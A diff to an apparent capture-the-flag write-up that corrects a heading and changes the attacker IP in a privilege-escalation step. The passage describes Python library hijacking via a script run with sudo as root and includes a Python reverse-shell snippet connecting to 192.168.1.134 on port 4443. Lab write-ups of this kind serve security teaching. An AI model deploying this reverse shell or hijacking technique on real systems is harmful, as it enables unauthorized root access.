@@ -291,8 +291,9 @@ Decrypted the string and found useful information. We authenticated as the arasa
 
 ```bash
 sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py
-Exploiting the Vulnerability
 ```
+
+## Exploiting the Vulnerability
 
 Using Python Library Hijacking to gain root access by modifying the script.
 
@@ -302,7 +303,7 @@ import subprocess
 import os
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.0.2.5", 4443))
+s.connect(("192.168.1.134", 4443))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
